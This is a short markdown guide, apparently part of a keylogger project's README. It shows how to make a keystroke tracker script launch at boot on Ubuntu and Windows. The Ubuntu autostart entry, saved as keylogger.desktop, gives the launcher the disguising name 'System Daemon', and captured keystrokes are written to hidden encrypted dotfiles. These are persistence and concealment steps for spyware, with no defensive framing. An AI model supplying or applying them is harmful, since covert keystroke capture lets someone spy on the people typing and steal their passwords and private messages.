# ⚡ Auto-start on Boot

## Ubuntu

### Open autostart folder

`mkdir -p ~/.config/autostart`

`nano ~/.config/autostart/keylogger.desktop`

<b>Paste:</b>
``` 
[Desktop Entry]

Type=Application

Exec=python3 /full/path/to/my_keystroke_tracker/tracker.py

Hidden=false

NoDisplay=false

X-GNOME-Autostart-enabled=true

Name=System Daemon

Comment=Background Tracker
```

.


`✅ Now it starts automatically on every boot.`

# Windows

1️⃣ Press Win + R → type:

`shell:startup`


2️⃣ In Startup folder → create a shortcut

`python.exe path\to\tracker.py`

(OR create .bat file with that command and place in Startup folder)

✅ Now runs at boot on Windows.

## 🗂️ WHERE IS DATA STORED?
→ Both OS:

`~/.my_secret_keystrokes (encrypted file)`

`~/.my_secret_key (key)`